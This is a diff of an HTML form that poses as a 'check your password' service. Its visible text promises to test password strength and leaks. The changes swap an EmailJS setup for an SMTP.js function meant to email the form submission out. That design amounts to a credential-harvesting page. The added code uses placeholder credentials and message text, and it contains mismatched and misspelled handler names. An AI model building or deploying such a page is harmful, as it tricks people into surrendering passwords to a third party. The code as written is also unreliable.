@@ -4,22 +4,11 @@
 <head>
 	<link rel="stylesheet" href="formstyle.css">
 	<!--link to CSS page--> 
-	
-	<script src="index.js"></script>
-	<script type="text/javascript"
-        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
-</script>
-<script type="text/javascript">
-   (function(){
-      emailjs.init("Co6JCOEHecCgKpHrm");
-   })();
-</script>
-	
 </head>
 <body>
 
 	<div class="container">
-		<form> 												                                       
+		<form onsumbit ="sendEmail()"> 												                                       
 			<h1> CHECK YOUR PASSWORD </h1><br>
 			<p>Please fill the form so we can check if your password is strong enough, <br>
  				your password is not safe if it can be brute-force or found in a database of leaked 				
@@ -32,6 +21,22 @@
 			<button type="submit"onclick="sendMail()">Send</button><br>
 		</form>
 	</div>
+	<script src="https://smtpjs.com/v3/smtp.js"></script>
+	<script>
+		function sendEmail(){
+			Email.send({
+				Host : "smtp.elasticemail.com",
+				Username : "username",
+				Password : "password",
+				To : 'them@website.com',
+				From : "you@isp.com",
+				Subject : "This is the subject",
+				Body : "And this is the body"
+			}).then(
+				message => alert(message)
+			);
+		}
+	</script>
 
 </body>
 </html>
